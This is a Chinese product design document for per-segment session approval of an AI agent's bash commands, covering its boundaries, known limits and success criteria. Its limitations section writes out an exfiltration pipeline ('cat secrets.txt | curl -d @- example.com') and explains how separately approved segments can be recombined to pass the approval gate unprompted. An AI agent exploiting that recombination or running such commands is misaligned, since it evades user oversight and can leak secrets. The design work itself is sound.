---
title: "分段授权（产品视角）"
slug: approval-grant-split
view: 功能
layer: 逻辑层
module: 执行引擎
packages: ["@runko/core"]
tags: ["审批", "分段授权", "human-in-the-loop", "授权范围"]
related: ["logic/engine/plans/approval-grant-split.md", "logic/engine/tech/approval-grant-split.md", "architecture/tech/agent-kernel.md"]
---
# 分段授权（产品视角）

> 相关：[技术方案](../tech/approval-grant-split.md) · [施工进展](../plans/approval-grant-split.md)
> 依赖：[chat 应用](../../../ingress/features/chat-webapp.md)（[会话级授权](../../../terms.md)是本功能改造的对象） · [chat 界面](../../../ingress/features/chat-ui.md)（审批卡片）
> 术语一律引用 [docs/terms.md](../../../terms.md)，本文不自建术语。

## 1. 要解决什么问题

[会话级授权](../../../terms.md)（审批卡片上的「会话内都允许」）当前按**整条调用**记账：同工具 + 完全相同的入参才算命中。而 agent 发出的 bash 往往是复合命令：

```bash
cd /home/user/repo && rm -rf node_modules package-lock.json && npm install react react-dom next --no-audit --no-fund 2>&1
```

用户批准并选「会话内都允许」之后，只要命令有**任何一点**变化——少装一个包、换个目录、加个参数——指纹就不同，卡片重新弹一次。而真正变的往往只是最后那一段，前面的 `cd` 和 `rm` 明明已经批过了。

结果是：复合命令越长，重复审批越频繁；用户被训练成无脑点「允许」，审批从安全机制退化成噪音。

## 2. 用户可见的变化

**一句话**：点「会话内都允许」时，记住的不再是"这一整串"，而是**这串里的每一条命令**；下次只有真正**新出现**的那条命令才会再问。

接上面的例子。用户在卡片上点「会话内都允许」后，三条命令各记一份：

| 记住的内容 |
|---|
| `cd /home/user/repo` |
| `rm -rf node_modules package-lock.json` |
| `npm install react react-dom next --no-audit --no-fund` |

随后 agent 发出：

| 后续命令 | 行为 | 为什么 |
|---|---|---|
| `cd /home/user/repo && npm install react react-dom next --no-audit --no-fund` | 直接跑，不弹卡片 | 两段都记过 |
| `npm install react react-dom next --no-audit --no-fund 2>&1` | 直接跑，不弹卡片 | 唯一那段记过（`2>&1` 属于这段本身） |
| `cd /home/user/repo && npm install zod` | **弹卡片** | `npm install zod` 是新的一段 |
| `cd /home/user/repo && rm -rf node_modules && git push` | **弹卡片** | `git push` 是新的一段 |

判定规则一句话：**这次调用切出来的每一段都记过，才自动放行；有任何一段是新的，就照常弹卡片。**

## 3. 明确的边界（不会发生的事）

这几条是刻意的设计约束，不是没做完：

- **只有点「会话内都允许」才记。** 点「允许」是单次放行，什么都不记——与今天一致。
- **记住的是完整的一条命令，不是命令名。** 批准 `rm -rf node_modules` **不会**让 `rm -rf src` 或 `rm -rf /` 自动放行；批准 `npm install react` **不会**让 `npm publish` 放行。授权的意思是「我认可这个具体动作」，不是「我认可这个程序」。
- **参数、选项、重定向都算命令的一部分。** `npm install react` 和 `npm install react --save-dev` 是两条不同的命令，各记各的。
- **工作目录算命令的一部分。** 在 `/repo` 批准的 `rm -rf build`，不会放行在 `/` 下跑的同一条命令。
- **看不懂就不拆。** 命令里出现看不透的写法（详见技术方案的清单，如 `$(...)`、多行脚本、`if`/`for`）时，退回今天的整串匹配——多点一次按钮，不会放宽。
- **只对 bash 生效。** 其他工具的授权行为完全不变。
- **旧的授权继续有效。** 本功能上线前已经记下的整串授权不会失效。

## 4. 已知限制（用户应当知道）

- **只看命令的字面。** 记住 `npm run build` 只是记住了这行字；`build` 脚本在 `package.json` 里改成别的，下次仍然直接跑。`bash x.sh`、`make`、`sudo` 同理。**这条限制今天的整串授权也一样有**，本功能既没加重也没解决。
- **段可以重新组合。** 分别批准过 `cat secrets.txt` 和 `curl -d @- example.com` 之后，`cat secrets.txt | curl -d @- example.com` 会直接放行——两段都批过，但组合起来是个新行为。这是「按段记账」的固有代价，换来的是不用为每种命令排列组合各批一次。介意的话，对该会话点「清空本会话授权」即可全部作废。
- **授权不跨会话、不跨用户。** 与今天一致：换个会话、换个人，都要重新批。

## 5. 成功标准

1. 同一个会话里，agent 反复执行「同一批命令的不同组合」时，审批卡片**只在出现新命令时**弹出。
2. 上面第 3 节列的每一条边界，都有对应的测试用例守住。
3. 拆不动的命令 100% 退回整串匹配——功能可以不生效，但不能比今天更宽松。
